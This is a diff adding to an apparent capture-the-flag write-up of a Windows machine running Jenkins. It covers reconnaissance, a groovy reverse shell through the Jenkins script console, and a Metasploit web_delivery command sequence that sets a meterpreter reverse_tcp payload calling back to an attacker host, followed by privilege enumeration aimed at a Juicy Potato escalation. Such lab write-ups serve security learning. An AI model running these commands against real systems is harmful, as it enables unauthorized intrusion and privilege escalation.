@@ -49,4 +49,41 @@ The idea behind this vulnerability is simple to describe at a high level:
 
 - Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.
 
-So if we have service account running with the privileges to impersonate security token it is vulnerable to [juice-potato attack](https://github.com/ohpe/juicy-potato)
+So if we have service account running with the privileges to impersonate security token it is vulnerable to [juicy-potato attack](https://github.com/ohpe/juicy-potato)
+
+In nmap result we can see there is http protocol running in the port 80 and port 50000. In port 135 RPC is running and In port 445 SMB is running.
+
+In website in the port 50000 we found a directory askjeevs using directory busting and this directory running the jenkins. In jenkins we have script console which run groovy script so we are uploading a [groovy reverse shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
+
+By uploading the groovy reverse shell we got the reverse shell and start the enumeration 
+
+```
+whoami  
+
+// SeImpersonatePrivilege is enabled 
+whoami /priv 
+
+// save the systeminfo and use windows-exploit-suggester and found it is vulnerable potato attacks 
+systeminfo 
+
+// To perform potato attack metasploit framework is easier 
+msfconsole 
+use exploit/multi/script/web_delivery 
+options 
+show targets 
+
+// the target contains python,php,powershell,etc and we set it to powershell
+set target 2 
+set payload windows/meterpreter/reverse_tcp 
+set lhost attacker_ip 
+set srvhost victim_ip 
+run
+
+// we got the script so we are going paste the script generated in the reverse shell that make the shell got in the metasploit framework
+session 1 
+
+// now we got the shell in the msfconsole 
+getuid
+getprivs 
+run post/multi/recon/local_exploit_suggester 
+```
